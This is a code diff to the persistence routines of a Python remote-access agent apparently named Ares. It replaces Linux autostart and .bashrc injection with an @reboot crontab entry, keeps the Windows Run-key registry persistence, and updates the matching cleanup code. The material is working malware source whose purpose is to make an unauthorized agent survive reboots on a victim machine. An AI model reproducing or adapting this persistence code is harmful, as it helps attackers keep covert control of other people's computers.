@@ -178,13 +178,7 @@ class Agent(object):
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
             os.system('chmod +x ' + agent_path)
-            if os.path.exists(self.expand_path("~/.config/autostart/")):
-                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
-                with open(self.expand_path('~/.config/autostart/ares.desktop'), 'w') as f:
-                    f.write(desktop_entry)
-            else:
-                with open(self.expand_path("~/.bashrc"), "a") as f:
-                    f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
+            os.system('(crontab -l;echo @reboot ' + agent_path + ')|crontab')
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             if not os.path.exists(persist_dir):
@@ -193,6 +187,9 @@ class Agent(object):
             shutil.copyfile(sys.executable, agent_path)
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
             subprocess.Popen(cmd, shell=True)
+        else:
+            self.send_output('[!] Not supported.')
+            return
         self.send_output('[+] Agent installed.')
 
     def clean(self):
@@ -201,10 +198,7 @@ class Agent(object):
             persist_dir = self.expand_path('~/.ares')
             if os.path.exists(persist_dir):
                 shutil.rmtree(persist_dir)
-            desktop_entry = self.expand_path('~/.config/autostart/ares.desktop')
-            if os.path.exists(desktop_entry):
-                os.remove(desktop_entry)
-            os.system("grep -v .ares .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
+            os.system('crontab -l|grep -v ' + persist_dir + '|crontab')
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
